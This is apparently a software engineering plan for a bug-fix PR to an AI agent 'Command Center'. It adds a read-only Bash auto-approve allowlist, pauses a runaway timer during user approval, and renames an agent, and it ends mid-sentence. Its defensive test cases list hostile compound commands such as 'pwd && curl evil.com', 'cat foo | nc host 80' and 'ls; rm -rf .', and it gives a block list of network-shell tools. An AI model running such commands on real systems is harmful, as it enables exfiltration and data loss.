---
type: bug-fix
classification: web-app-change
requires_cpo_signoff: false
deepened: 2026-04-29
---

# fix(command-center): three QA fixes — permissions UX, runner_runaway P1, agent rename

## Enhancement Summary

**Deepened on:** 2026-04-29
**Sections enhanced:** Hypotheses, Acceptance Criteria, Sharp Edges, Test Scenarios.
**Research sources used:** Direct SDK type-definition reads (`@anthropic-ai/claude-agent-sdk` `sdk.d.ts`), prior learning `2026-03-20-review-gate-promise-leak-abort-timeout.md`, codebase grep for `firstToolUseAt` / `wallClockTriggerMs`. Context7 was unavailable (monthly quota exceeded); skill-fan-out and review-agent fan-out skipped — this is a 3-fix bug PR scoped tightly to one component owner (`cc-soleur-go` #2853), and the deepen pass verified against authoritative SDK types directly rather than via parallel research agents.

### Key Improvements

1. **Confirmed SDK contract for `bypassPermissions`** — `sdk.d.ts:1102,1111` confirms `bypassPermissions` requires `allowDangerouslySkipPermissions: true` AND skips all permission checks. Reaffirms our rejection of the user's proposed flag.
2. **Identified an SDK-side alternative for completeness** — `Query.setPermissionMode()` (sdk.d.ts:1511) and `Query.interrupt()` (sdk.d.ts:1504) exist. Considered and rejected — they would scope-creep into Stage 2.13 control-plane work.
3. **Cross-referenced prior learning on review-gate promise leaks (#840 / 2026-03-20).** That fix added `abortableReviewGate` with a 5-minute safety net. Our `notifyAwaitingUser` integrates with the same lifecycle — when the safety net rejects, the runner's `awaitingUser=false` transition must fire too, otherwise the resumed timer would never re-arm and a dispatch-time error would never reach the user.
4. **Tightened the safe-Bash regex** — explicit single-token enforcement plus shell-metacharacter denylist documented at the regex level, not just at the test level.

### New Considerations Discovered

- The runaway timer + Bash gate interaction is a **deadlock-shape bug**, not a runaway: the runner is *waiting* on a user, not *running away*. The error-message taxonomy lies. Bonus AC added below to fix the user-facing string.
- The 5-minute review-gate safety-net (from #840) and the 30-second runaway timer overlap. After our fix, a user who walks away for 5 minutes hits the safety-net rejection FIRST (the gate aborts → canUseTool throws → consumeStream catches → `internal_error`). This is correct UX (we want a definite outcome at 5 min), but tests must cover both interleavings.


Branch: `feat-one-shot-command-center-qa-fixes`
Worktree: `.worktrees/feat-one-shot-command-center-qa-fixes/`
Plan date: 2026-04-29
Owner: cc-soleur-go (#2853)

## Overview

QA on the newly-shipped Command Center surfaced three issues that need fixing
in one PR:

1. **Permissions UX** — Trivial Bash commands (`pwd`, `ls`, `cat`, `git status`)
   surface an Approve/Deny dialog. After resolution the dialog stays
   visually expanded with a small "approved" footer instead of collapsing
   to a compact row. Both UX papercuts.
2. **`runner_runaway` P1** — The wall-clock runaway timer arms at the
   first `tool_use` and fires unconditionally 30s later if no
   `SDKResultMessage` arrives. When a Bash review-gate awaits the user's
   click, the wall clock keeps running — a user who pauses ≥30s before
   approving (or whose first-turn tool sequence is Bash-gate → user click
   → Grep → … and crosses 30s in aggregate) sees the workflow torpedoed
   with `Workflow ended (runner_runaway) — retry to continue.` This
   makes Command Center unusable for any non-trivial Bash-touching prompt.
3. **Rename** — The agent label "Router · Command Center Router" is
   awkward. Rename across UI labels, internal id, and tests.

## User-Brand Impact

**If this lands broken, the user experiences:** a Command Center that
prompts modal Approve/Deny for every read-only filesystem peek (`pwd`,
`ls`), then kills the conversation 30 seconds later if the user paused
to read the prompt. The product becomes a demo, not a tool.

**If this leaks, the user's data is exposed via:** the safe-Bash
allowlist is the load-bearing surface. A regex that's too broad lets the
LLM execute commands a user never intended; a regex that's too narrow
forces every user click and re-creates the runaway window. The bash
auto-approve allowlist must be shorter, tighter, and verified against
`BLOCKED_BASH_PATTERNS` (which already denies `curl|wget|nc|eval|sudo|sh -c|/dev/tcp|base64 -d`).

**Brand-survival threshold:** none.

- `threshold: none, reason: this PR widens the auto-approve pre-gate within an existing trust-boundary (read-only file/git inspection on a per-user sandbox) and pauses a wall-clock timer; it does NOT touch authentication, payment, multi-tenant isolation, or BYOK key handling. The existing BLOCKED_BASH_PATTERNS deny-list, FILE_TOOLS sandbox-path check, and plugin MCP allowlist all remain in force. A misconfigured allowlist regex is a single-user UX issue (extra prompt OR a missed prompt for a read-only command), not a brand-survival event.`

The auto-approve list is read-only file/git inspection commands. It does
NOT remove the Bash review-gate — it widens the auto-approve pre-gate so
the most common nuisance prompts disappear without expanding the trust
boundary the existing blocklist already enforces. Existing security
guards (BLOCKED_BASH_PATTERNS deny, file-tool sandbox path check, plugin
MCP allowlist) remain in place for everything else.

## Research Reconciliation — Spec vs. Codebase

| User claim | Reality | Plan response |
|---|---|---|
| "Use `--dangerously-skip-permissions` so the user is not bothered by simple commands" | This is the SDK `permissionMode: "bypassPermissions"` flag. It bypasses **the entire `canUseTool` chain**, including `BLOCKED_BASH_PATTERNS` (curl/wget/nc/eval/sudo/sh -c/base64 -d/dev/tcp), file-path workspace checks, plugin MCP allowlists, and tier-gated platform tools. In a multi-tenant web app where users sign in and an LLM executes commands inside their sandbox, this would let any prompt-injected payload pivot into network egress or privilege escalation. | Reject `bypassPermissions`. Implement a **safe-Bash allowlist** (read-only file/git/cwd commands) checked BEFORE the review-gate inside `permission-callback.ts`. Auto-approve commands matching the allowlist; everything else still flows through the existing review-gate. |
| "Approving a Grep tool call surfaced runner_runaway" | `Grep` is a `FILE_TOOLS` member with no review-gate — it auto-allows after the workspace path check (`canUseTool` → `isFileTool` → `allow`). The runaway fires from `wallClockTriggerMs` (30s) after the FIRST `tool_use` with no `SDKResultMessage` clearing it. The user's "approving Grep" was actually the Bash review-gate from the prior turn (`pwd`); during the user's pause the timer kept ticking. | Fix is at the runner level: the runaway timer must NOT count time spent waiting on a user review-gate. Two strategies (selected: B). |
| "Auto-close the approve/deny dialog once user has approved/rejected" | `ReviewGateCard` already collapses to a compact "Selected: …" row on `resolved`. The dialog stuck open in screenshot 1 is the `BashApprovalCard` (interactive_prompt path), which renders a tiny "approved" footer beneath the still-expanded button block. | Refactor `BashApprovalCard` resolved-state to mirror `ReviewGateCard`'s compact resolved row. |

## Hypotheses

### H1 — `runner_runaway` is wall-clock timer firing during Bash gate await

**Evidence (load-bearing):** `apps/web-platform/server/soleur-go-runner.ts:578-587`

```ts
function armRunaway(state: ActiveQuery): void {
  clearRunaway(state);
  const firedAtStart = state.firstToolUseAt ?? now();
  state.runaway = setTimeout(() => {
    if (state.closed) return;
    const elapsedMs = now() - firedAtStart;
    emitWorkflowEnded(state, { status: "runner_runaway", elapsedMs });
  }, wallClockTriggerMs);
}
```

`armRunaway` is called once on first `tool_use` (line 677) and only
clears on `SDKResultMessage` (line 733). The Bash review-gate awaits the
user's click via `abortableReviewGate` — during that await the SDK is
**blocked on the canUseTool callback**, no SDKResultMessage arrives,
runaway timer keeps ticking. After 30s elapsed → workflow ended.

**Reproduction (deterministic in tests):** existing test
`soleur-go-runner.test.ts:460` asserts the trigger fires at 30s
of consecutive tool_uses without a result. Replicate with: turn 1
tool_use Bash → review-gate awaits user click → user takes 31s →
runaway fires before user finishes. Real screenshot shows exactly this.

**Conclusion:** confirmed root cause. Fix at the runner.

### Research Insights — H1

**SDK contract confirmed (sdk.d.ts:1494, 1504, 1511):**

```ts
export declare interface Query extends AsyncGenerator<SDKMessage, void> {
  interrupt(): Promise<void>;                                  // sdk.d.ts:1504
  setPermissionMode(mode: PermissionMode): Promise<void>;      // sdk.d.ts:1511
}
```

These control-plane methods could in principle let the runner *cancel* the awaiting tool_use rather than time-out the wall clock. **Considered and rejected** — switching to `Query.interrupt()` semantics is Stage 2.13 control-plane work; not in scope. The current fix (pause the timer while `awaitingUser`) is strictly additive and does NOT change the SDK call shape.

**Cross-reference: #840 / `2026-03-20-review-gate-promise-leak-abort-timeout.md`**

Prior fix added `abortableReviewGate` with:
- 5-minute safety-net timeout via `setTimeout` + `clearTimeout` (NOT `AbortSignal.timeout()` — that leaks timers).
- `timer.unref()` so the safety net does NOT block process shutdown.
- Promise REJECTION (not synthetic resolve) so the existing catch/finally cleanup paths run.

**Implication for our fix:** when the 5-min safety-net rejects, our `notifyAwaitingUser(false)` transition must still fire OR the error path itself must reset the timer. Otherwise: user walks away → 5min safety-net rejects → canUseTool throws → consumeStream's catch fires `internal_error` → workflow ends. That IS the expected behavior, but the runner must NOT be left with `awaitingUser=true` and a dangling stale timer state. Fix: `cc-dispatcher.ts updateConversationStatus` is called from BOTH the success branch (`"active"` after the user picks) AND the rejection branch (`"failed"` on timeout/abort). Our hook fires off `updateConversationStatus`, so it gets called in both paths automatically.

**Performance note:** `notifyAwaitingUser` is called at most twice per Bash gate (true on issue, false on resolve). The runner's pause/resume cost is one `clearTimeout` + one `armRunaway` — sub-microsecond. No measurable impact.

### H2 — `bypassPermissions` would fix nuisance prompts but is unsafe

See Research Reconciliation row 1. Rejected.

**SDK-side confirmation (sdk.d.ts:1101-1111):**

```ts
// permissionMode?: PermissionMode;
//   - 'default'           — Standard behavior, prompts for dangerous operations
//   - 'acceptEdits'        — Auto-accept file edit operations
//   - 'bypassPermissions'  — Bypass all permission checks (requires allowDangerouslySkipPermissions)
//   - 'plan'               — Planning mode, no actual tool execution
//   - 'dontAsk'            — Don't prompt for permissions, deny if not pre-approved
allowDangerouslySkipPermissions?: boolean;
```

`bypassPermissions` is an SDK-level kill-switch for the *entire* permission chain, including hook-level deny rules and the `canUseTool` callback. In our codebase that means: BLOCKED_BASH_PATTERNS deny (`curl|wget|nc|sudo|sh -c|/dev/tcp|base64 -d|eval`) is bypassed; FILE_TOOLS sandbox-path check is bypassed; tier-blocked platform tools are bypassed; plugin MCP allowlist is bypassed. Production is multi-tenant; the LLM is fed prompt-injection-vulnerable user input. Setting `bypassPermissions` would convert any successful prompt-injection into immediate code execution within the user's sandbox, with credentials available via env (BYOK key, service tokens). Rejected, no follow-up.

**Alternative considered (rejected):** `permissionMode: "acceptEdits"` auto-approves file edits. Doesn't help — `pwd` is a Bash command, not a file edit. And it would auto-approve `Edit`/`Write` which currently require explicit canUseTool consent. Strict regression.

**Alternative considered (rejected):** `permissionMode: "dontAsk"` denies anything not pre-approved. The codebase already configures `allowedTools` per session (legacy path) but the cc-soleur-go path uses `mcpServers: {}` and lets `canUseTool` decide. Switching to `dontAsk` would re-engineer the whole permission model. Strict scope creep.

### H3 — `BashApprovalCard` resolved state is functionally working but visually wrong

Looking at `interactive-prompt-card.tsx:305-353`: when `disabled === true`
the buttons stay rendered with `disabled:opacity-50` and a small
`mt-2 text-xs text-neutral-500` line shows "approved" / "denied". This
matches the user's "approve/deny dialog still visible after action with
'approved' text underneath — should dismiss" exactly. The fix is a
compact resolved render, parity with `ReviewGateCard:40-49`.

### H4 — Rename: "Soleur System Agent" vs alternatives

Candidates considered:
- "Soleur System Agent" — user's suggestion. Generic; matches `domain: "System"` in domain-leaders.ts.
- "Soleur Concierge" — implies user-facing helpfulness, less mechanical.
- "Soleur Director" — implies routing/orchestration. Closer to actual function.
- "Workspace Coordinator" — explains what it does; longer.

**Selected: "Soleur Concierge"** — matches the actual UX role (greets
the user, dispatches their request, returns when done) better than
"System Agent" (implies a daemon/maintenance role). Single-word brand
voice consistent with the rest of Soleur's persona system. The user's
suggestion is acceptable as a fallback if a domain leader rejects
Concierge during review.

Internal ID stays `cc_router` — renaming the id ripples into 8 test
files, the chat-state-machine narrowing, leader-colors map, and tool-use
chip discriminator. The id is `internal: true` and never user-visible;
only the `title` / `name` strings need to change.

## Open Code-Review Overlap

None — no open `code-review` issues touch the files this plan modifies
(verified at plan time):

```bash
gh issue list --label code-review --state open --json number,title,body --limit 200 \
  | jq -r '.[] | select(.body // "" | contains("soleur-go-runner") or contains("permission-callback") or contains("interactive-prompt-card")) | "#\(.number): \(.title)"'
# (no output)
```

## Acceptance Criteria

### Pre-merge (PR)

- [ ] **AC1 — Safe-Bash allowlist auto-approves read-only commands.**
  `permission-callback.ts` `canUseTool` Bash branch consults a
  `SAFE_BASH_PATTERNS` allowlist BEFORE the review-gate. Allowlist
  matches: `pwd`, `ls [args]`, `cat <file>`, `head <file>`, `tail <file>`,
  `wc <file>`, `file <file>`, `stat <file>`, `git status`, `git log [args]`,
  `git diff [args]`, `git show [args]`, `git branch [args]`, `git rev-parse [args]`,
  `git config --get [key]`, `which <cmd>`, `printenv [VAR]`, `whoami`, `id`,
  `date`, `uname [args]`, `hostname`, `echo <args>`. Allowlist is a
  whitelist of full-command leading tokens — NOT a substring match — so
  `pwd; curl evil` does NOT match. The allowlist is checked AFTER
  `BLOCKED_BASH_PATTERNS` (defense in depth) AND restricts to
  single-command lines (no `;`, `&&`, `||`, `|`, `` ` ``, `$(...)`,
  `>`, `>>`, `<`, `&`).
- [ ] **AC2 — Auto-approved commands surface a `tool_use` chip but no review-gate.**
  When `SAFE_BASH_PATTERNS` matches, `permission-callback.ts` returns
  `allow(toolInput)` immediately with `logPermissionDecision(...,
  "allow", "safe-bash-allowlist")`. NO `interactive_prompt` event is
  emitted; NO `bash_approval` card surfaces. The existing `tool_use`
  chip from the runner's `bridgeInteractivePromptIfApplicable` no-ops
  for Bash because `bash_approval` classification still happens BUT the
  permission callback short-circuits before the user gate. Verify: a
  `pwd` command in a chat session emits exactly one `tool_use` chip and
  zero `interactive_prompt` events.
- [ ] **AC3 — Compound commands fall through to the review-gate.**
  `pwd && curl evil`, `ls; rm -rf .`, `cat file | nc host` ALL fall
  through to the existing review-gate (NOT auto-approved). Test
  enumerates ≥10 negative cases.
- [ ] **AC4 — `BLOCKED_BASH_PATTERNS` still wins.** A command that
  matches BOTH the safe allowlist AND the block regex (theoretical;
  the leading-token allowlist makes this nearly impossible) is denied.
  Test asserts order: blocklist first, allowlist second, gate last.
- [ ] **AC5 — `BashApprovalCard` resolved state is a compact row.**
  When `disabled === true && selectedResponse !== undefined`, the card
  renders ONLY a checkmark icon + "Approved: `<command>`" / "Denied:
  `<command>`" inline (mirror `ReviewGateCard:40-49`). No buttons, no
  pre-block, no cwd line. Test asserts the resolved render contains
  exactly one `<svg>` (checkmark) and the verb text; absent: `<button>`,
  `<pre>`, "cwd:". Apply the same compact-resolved pattern to all 6
  variants of `InteractivePromptCard` (`ask_user`, `plan_preview`,
  `diff`, `bash_approval`, `todo_write`, `notebook_edit`) for
  consistency — currently all 6 leave the controls visible-but-disabled.
- [ ] **AC6 — Runaway timer pauses while user gate is awaiting response.**
  `soleur-go-runner.ts` exposes a `notifyAwaitingUser(state, true|false)`
  signal. While `awaitingUser === true`, the runaway timer is cleared;
  on `awaitingUser === false` (user responded OR aborted), if the
  conversation still has not received an `SDKResultMessage`, the timer
  is RE-ARMED with a fresh `firstToolUseAt = now()`. The runner counts
  only "agent compute time", not "human read time". `cc-dispatcher.ts`
  wires `notifyAwaitingUser(true)` from `updateConversationStatus(..., "waiting_for_user")`
  and `(false)` from `updateConversationStatus(..., "active")`.
- [ ] **AC7 — Existing 30s-of-tool-uses-without-result test still passes.**
  `soleur-go-runner.test.ts:460` (secondary wall-clock trigger) is
  unchanged in behavior: when there is no awaiting-user pause and the
  agent emits tool_uses for 30s without a result, runaway still fires.
- [ ] **AC8 — New test: runaway DOES NOT fire while user gate is awaiting.**
  Add test: arm the timer (emit Bash tool_use), call
  `notifyAwaitingUser(true)`, advance 60s of fake timers, assert no
  `runner_runaway` event emitted. Then `notifyAwaitingUser(false)`,
  emit `SDKResultMessage`, assert clean completion.
- [ ] **AC9 — New test: runaway re-arms after user resumes if still no result.**
  Arm timer, `notifyAwaitingUser(true)`, advance 5s,
  `notifyAwaitingUser(false)`, advance 31s (no `SDKResultMessage`),
  assert `runner_runaway` fires AT t=36s (not t=31s; the clock was
  paused for the 5s gate window).
- [ ] **AC10 — Agent rename in `domain-leaders.ts`.** The `cc_router`
  entry's `title: "Command Center Router"` becomes `title: "Soleur
  Concierge"`; `name: "Router"` becomes `name: "Concierge"`.
  `description` is rewritten in one sentence: "Greets the user, routes
  their request to the right Soleur workflow, and reports back."
  Internal `id: "cc_router"` is unchanged.
- [ ] **AC11 — Rename in user-visible strings.** Grep across
  `apps/web-platform/`, `knowledge-base/`, and Eleventy docs
  (`plugins/soleur/docs/`) for the substring `Command Center Router`.
  Update every match. Update screenshot references in ADR-022 if any.
- [ ] **AC12 — All existing CC tests pass.**
  - `apps/web-platform/test/soleur-go-runner.test.ts`
  - `apps/web-platform/test/soleur-go-runner-lifecycle.test.ts`
  - `apps/web-platform/test/cc-dispatcher.test.ts`
  - `apps/web-platform/test/cc-dispatcher-real-factory.test.ts`
  - `apps/web-platform/test/cc-dispatcher-bash-gate.test.ts`
  - `apps/web-platform/test/permission-callback.test.ts` (or canusertool-decisions)
  - `apps/web-platform/test/cc-soleur-go-end-to-end-render.test.tsx`
  - `apps/web-platform/test/tool-use-chip.test.tsx`
  - `apps/web-platform/test/chat-state-machine.test.ts`
- [ ] **AC13 — Compound runs.** Local `bun test apps/web-platform/test/` is green.
- [ ] **AC14 — ADR-022 footer note.** Append a 4-line "2026-04-29 follow-up"
  section to `knowledge-base/engineering/architecture/decisions/ADR-022-sdk-as-router.md`
  documenting (a) the safe-Bash allowlist surface, (b) the awaiting-user
  pause hook, and (c) the rename. No new ADR file — these are bug-fix
  follow-ups to the original decision, not a new decision.
- [ ] **AC17 — 5-minute review-gate safety net interleaving test.** Add
  test to `soleur-go-runner-awaiting-user.test.ts`: arm runaway, fire
  `notifyAwaitingUser(true)`, advance 5min + 1s of fake timers, simulate
  `abortableReviewGate` rejection (canUseTool throws inside SDK promise
  chain), assert (a) `consumeStream` catch fires once with
  `status: "internal_error"`, (b) the runaway timer does NOT also fire,
  (c) `state.closed === true`, (d) NO double-emit (workflow_ended
  fires exactly once). Locks the prior #840 contract together with
  the new pause hook.
- [ ] **AC18 — User-facing error message taxonomy fix.** The current
  `cc-dispatcher.ts onWorkflowEnded` recoverable-status branch emits
  `Workflow ended (runner_runaway) — retry to continue.` — that message
  is technically wrong AND user-hostile. Replace with status-specific
  copy:
  - `runner_runaway`: "The agent went idle without finishing. Try
    sending another message to nudge it forward." (when this fires
    *despite* our fix, it means the agent got stuck, not that it ran
    away — the message should match the user's mental model.)
  - `cost_ceiling`: "This conversation reached the per-workflow cost
    cap. Start a new conversation to continue." (current copy reads
    like a runtime error.)
  Status copy lives in a single map (`WORKFLOW_END_USER_MESSAGES`
  exported from `cc-dispatcher.ts`) so future statuses don't drift.

### Post-merge (operator)

- [ ] **AC15 — QA on the deployed dev Command Center.** After merge +
  Vercel deploy, the operator opens the dev Command Center, types
  "what's my current directory?" — agent should run `pwd` without a
  prompt. Then "delete `~/.bashrc`" — agent should still surface a
  Bash review-gate (negative test). Screenshot both.
- [ ] **AC16 — Screenshot the compact resolved card.** Trigger a
  `bash_approval` interactive_prompt (e.g., a workflow that emits a
  destructive command), approve it, screenshot the post-approval row.

## Files to Edit

- `apps/web-platform/server/permission-callback.ts` — add
  `SAFE_BASH_PATTERNS` allowlist + `isBashCommandSafe()` helper +
  pre-gate auto-approve branch (AC1, AC2, AC3, AC4).
- `apps/web-platform/server/soleur-go-runner.ts` — add `notifyAwaitingUser`
  to the `SoleurGoRunner` interface; add `awaitingUser: boolean` to
  `ActiveQuery`; modify `armRunaway` / `clearRunaway` to respect the
  pause signal (AC6, AC7, AC8, AC9).
- `apps/web-platform/server/cc-dispatcher.ts` — wire
  `notifyAwaitingUser` from the `updateConversationStatus` closure in
  `realSdkQueryFactory` (AC6).
- `apps/web-platform/server/permission-callback-bash-batch.ts` — verify
  `deriveBashCommandPrefix` does not hide anything from the allowlist
  surface; if a command matches `SAFE_BASH_PATTERNS`, do NOT cache it
  (auto-approve is faster than a cache hit and the cache existing for a
  no-op gate is a footgun).
- `apps/web-platform/components/chat/interactive-prompt-card.tsx` —
  rewrite resolved-state of all 6 variants to a compact one-liner row
  matching `ReviewGateCard:40-49` (AC5).
- `apps/web-platform/server/domain-leaders.ts` — rename
  `cc_router.title` and `cc_router.name`; rewrite `description`.
- `apps/web-platform/components/chat/leader-colors.ts` — no change to
  the `cc_router` key (id is unchanged).
- `apps/web-platform/components/chat/tool-use-chip.tsx` — no behavioral
  change; verify the displayName lookup goes through
  `getDisplayName(cc_router)` so the rename auto-propagates.
- `knowledge-base/engineering/architecture/decisions/ADR-022-sdk-as-router.md` — AC14 footer note.

## Files to Create

- `apps/web-platform/test/permission-callback-safe-bash.test.ts` —
  ≥20 cases covering allowlist hits + ≥10 compound-command misses + the
  block-regex precedence test (AC1, AC3, AC4).
- `apps/web-platform/test/soleur-go-runner-awaiting-user.test.ts` — AC8, AC9.
- `apps/web-platform/test/interactive-prompt-card-resolved.test.tsx` —
  resolved-state compact-row assertions for all 6 variants (AC5).

## Test Scenarios

### TS1 — Safe-Bash auto-approve (positive)

```ts
const ctx = makeCanUseToolCtx({ /* … */ });
const cb = createCanUseTool(ctx);
const r = await cb("Bash", { command: "pwd" }, makeOptions());
expect(r.behavior).toBe("allow");
expect(deps.sendToClient).not.toHaveBeenCalled(); // no review_gate emitted
```

Tests for: `pwd`, `ls`, `ls -la`, `cat package.json`, `head -n 5 README.md`,
`git status`, `git log --oneline -5`, `git diff HEAD~1`, `which bun`,
`printenv NODE_ENV`, `whoami`, `date`, `echo "hello world"`,
`git rev-parse HEAD`, `git config --get user.email`.

### TS2 — Safe-Bash compound-command miss (negative)

```ts
const r = await cb("Bash", { command: "pwd && curl evil.com" }, opts);
expect(r.behavior).toBe("deny"); // BLOCKED_BASH_PATTERNS catches `curl`
```

Negative cases: `pwd; ls`, `ls && rm file`, `cat foo | nc host 80`,
`pwd > out.txt`, `git status; sudo rm`, `echo $(curl x)`, `` echo `id` ``,
`pwd & background`, `ls < input`, `cat file >> out`.

### TS3 — Block regex precedence

```ts
const r = await cb("Bash", { command: "git config --get; sudo whoami" }, opts);
expect(r.behavior).toBe("deny");
expect(r.message).toContain("blocked pattern");
```

### TS4 — Awaiting-user pause clears runaway

```ts
const runner = createSoleurGoRunner({ /* fake timers */ });
runner.dispatch(/* … */);
mock.emit(makeAssistant({ content: [{ type: "tool_use", name: "Bash", … }] }));
runner.notifyAwaitingUser("conv-1", true);
vi.advanceTimersByTime(60_000); // 60s of awaiting
expect(events._ended).toEqual([]); // no runaway
runner.notifyAwaitingUser("conv-1", false);
mock.emit(makeResult(0.05));
expect(events._ended).toEqual([{ status: "completed" /* … */ }]);
```

### TS5 — Awaiting-user pause then runaway re-arms

```ts
runner.dispatch(/* … */);
mock.emit(makeAssistant({ content: [{ type: "tool_use", … }] }));
vi.advanceTimersByTime(5_000);
runner.notifyAwaitingUser("conv-1", true);
vi.advanceTimersByTime(20_000); // user takes 20s
runner.notifyAwaitingUser("conv-1", false);
vi.advanceTimersByTime(29_999); // 29.999s of agent compute, no result
expect(events._ended).toEqual([]);
vi.advanceTimersByTime(2);
expect(events._ended).toMatchObject([{ status: "runner_runaway" }]);
```

### TS6 — Compact resolved card render

```tsx
render(
  <InteractivePromptCard
    kind="bash_approval"
    promptId="p1"
    conversationId="c1"
    payload={{ command: "rm -rf /tmp/foo", cwd: "/ws", gated: true }}
    resolved={true}
    selectedResponse="approve"
    onRespond={vi.fn()}
  />,
);
// Compact: one svg + verb text, no <button> / <pre> / "cwd:"
expect(screen.queryByRole("button")).not.toBeInTheDocument();
expect(screen.queryByText(/cwd:/)).not.toBeInTheDocument();
expect(screen.getByText(/Approved/)).toBeInTheDocument();
```

### TS7 — Rename surfaces in `domain-leaders.ts`

```ts
const router = DOMAIN_LEADERS.find((l) => l.id === "cc_router");
expect(router?.title).toBe("Soleur Concierge");
expect(router?.name).toBe("Concierge");
```

## Sharp Edges

- `--dangerously-skip-permissions` (SDK `permissionMode: "bypassPermissions"`)
  is the wrong fix and MUST NOT be used. The user's ask reads as "skip
  trivial approvals", not "remove the security boundary". The
  safe-Bash allowlist preserves the security boundary while removing the
  nuisance prompts.
- `SAFE_BASH_PATTERNS` is a whitelist of LEADING TOKENS, not a substring
  regex. `pwd` is allowed; `pwd && evil` is NOT. Any change to this
  regex MUST add ≥3 new compound-command negative tests.
- The runaway pause hook MUST be plumbed through `cc-dispatcher.ts`
  `updateConversationStatus`. The runner has no concept of "waiting for
  user" otherwise — the SDK doesn't surface that state to its caller.
- After renaming `title` / `name`, **do NOT** rename the
  `cc_router` ID. The rename of the ID would ripple into:
  `tool-use-chip.tsx`, `leader-colors.ts`, `chat-state-machine.ts`,
  8 test files, the WS message discriminator union. Out of scope here.
- The compact-resolved refactor of `InteractivePromptCard` must keep
  `data-prompt-kind` / `data-prompt-id` on the resolved row so existing
  test seams (`cc-soleur-go-end-to-end-render.test.tsx`) still find the
  card.
- Per `cq-silent-fallback-must-mirror-to-sentry`: the new
  `notifyAwaitingUser` signal must NOT silently drop on a missing
  conversation. If `activeQueries.get(conversationId)` returns
  `undefined`, log via `reportSilentFallback` (feature:
  `soleur-go-runner`, op: `notifyAwaitingUser`) — a CC dispatcher
  signaling for a conversation the runner doesn't know about is a real
  bug.
- Per `cq-union-widening-grep-three-patterns`: this plan does NOT widen
  `WSMessage` or `InteractivePromptKind`. No grep-three-patterns sweep
  needed.
- **`SAFE_BASH_PATTERNS` shell-metachar denylist.** The single-token
  enforcement is implemented by REJECTING any command containing one of
  `;`, `&`, `&&`, `|`, `||`, `\``, `$(`, `${`, `>`, `>>`, `<`, `<<`,
  `\n`, `\r`, `>&`, `2>&1`. The check uses a single regex (NOT
  `command.includes`) so escaped shells (`pwd\;ls`) don't sneak through
  — the regex is applied to the raw `command` string. After the metachar
  reject, the leading-token regex matches `^(pwd|ls|cat …)\b` plus a
  per-tool argument pattern (e.g., `cat` accepts only path-shaped args:
  `^cat (/[\w./-]+|\.\./[\w./-]+|[\w./-]+)$`).
- **`Glob` pattern in safe-bash regex.** Do NOT include `find` or `grep`
  in `SAFE_BASH_PATTERNS`. Both accept arbitrary executable arguments
  via `-exec`/`--exec` and could shell out. Stay narrow — file/git
  inspection only. (`find` is also redundant with the SDK's `Glob` tool
  which is already auto-allowed via `FILE_TOOLS`.)
- **Per `cq-silent-fallback-must-mirror-to-sentry` for `notifyAwaitingUser`:**
  the new method on `SoleurGoRunner` accepts `(conversationId, true|false)`.
  If `activeQueries.get(conversationId)` returns undefined: that's a
  real bug (cc-dispatcher signaling for an unknown conversation).
  Mirror via `reportSilentFallback(new Error("notifyAwaitingUser: no active query"), ...)`
  — do NOT silently no-op. Test asserts the mirror fires.
- **5-minute safety-net interaction (per learning #840):** the
  `abortableReviewGate` 5-min safety net wins over our pause. Tests
  must cover both interleavings: (a) user responds in <5min — pause →
  resume → optional re-arm → completion; (b) user walks away — pause →
  5min safety-net rejects → consumeStream catches → `internal_error`
  emitted once → no double-emit.
- **Status-copy drift:** the current "Workflow ended (X) — retry to
  continue" string template lives inline in `cc-dispatcher.ts onWorkflowEnded`.
  AC18 replaces with a typed map. Test snapshots ALL keys of
  `WorkflowEndStatus` against the map at compile time via
  `_exhaustive: never` rail so a future status added to the runner
  type union forces a copy update.

## Non-Goals

- **Bash batched-approval cache rework (#2921).** The cache is wired and
  works; this plan does not touch it. The safe-Bash allowlist is a
  separate, narrower mechanism (process-wide static regex, not
  per-(user, conversation) state).
- **`cc_router` ID rename.** Out of scope (see Sharp Edges).
- **Multi-question `AskUserQuestion`.** Existing log-warn behavior unchanged.
- **`workflow_ended` recoverable-vs-terminal split (Stage 3 of #2853).**
  The current dispatch maps `runner_runaway` to a recoverable error
  — the fix here is to STOP firing `runner_runaway` during user pauses,
  not to change how the client renders it.

## Domain Review

**Domains relevant:** Engineering (CTO), Product (CPO).

### Engineering (CTO)

**Status:** carry-forward (this is a bug-fix follow-up to ADR-022 #2853;
the original CTO assessment of the SDK-as-router architecture stands).

**Assessment:** Two of three fixes are routine UX polish; the runaway
fix is a **state machine correctness bug** in the runner. The
`firstToolUseAt` field is being repurposed: it now means "agent compute
start time", not "first tool_use of turn". This is a small but real
contract change — the runner's wall clock excludes user-gate time. The
test suite captures both the existing (no-pause) and new (with-pause)
behaviors so the contract is documented in tests, not just in the
function comment.

### Product/UX Gate

**Tier:** advisory (modifies existing UI; no new pages/flows).
**Decision:** auto-accepted (pipeline; this is a bug-fix branch, not a
feature add).
**Agents invoked:** none (auto-accept).
**Pencil available:** N/A.

**Findings (heuristic, no agents spawned):**

- "Soleur Concierge" reads more brand-consistent than "Soleur System
  Agent" or "Command Center Router". If a copywriter review during
  PR rejects it, fall back to user's "Soleur System Agent" — both are
  acceptable.
- Compact resolved card matches the `ReviewGateCard` resolved row
  pattern, which has been validated by users for 2+ months.

## Implementation Phases

### Phase 1 — Tests RED

1. Write `permission-callback-safe-bash.test.ts` with allowlist hit /
   compound miss / block precedence cases. Run; expect compile error or
   "allowlist undefined" failures.
2. Write `soleur-go-runner-awaiting-user.test.ts` with TS4, TS5. Run;
   expect "notifyAwaitingUser is not a function" failures.
3. Write `interactive-prompt-card-resolved.test.tsx` for the 6 variants.
   Run; expect the existing "still has buttons in resolved state" rendering
   to fail the new assertions.

### Phase 2 — Implement GREEN

1. Add `SAFE_BASH_PATTERNS` array + `isBashCommandSafe()` to
   `permission-callback.ts`. Wire pre-gate branch.
2. Add `notifyAwaitingUser` to `SoleurGoRunner` interface +
   implementation. Wire from `cc-dispatcher.ts updateConversationStatus`.
3. Refactor 6 `InteractivePromptCard` variants to compact resolved row.
4. Rename `cc_router` `title` / `name` / `description` in `domain-leaders.ts`.
5. Update ADR-022 footer.
6. Run all targeted tests until green.

### Phase 3 — Compound + Review

1. `skill: soleur:compound` for any learnings.
2. `skill: soleur:review` (multi-agent).
3. Resolve review findings inline.

### Phase 4 — QA + Ship

1. Bun test suite green.
2. `skill: soleur:ship`.
3. Post-merge: deploy verification per AC15, AC16.

## Issue / PR Wiring

This plan was branched as `feat-one-shot-command-center-qa-fixes`
without a tracking GitHub issue (per the user's pipeline-mode invocation).
The PR body should reference `#2853` (cc-soleur-go parent), `#2860`
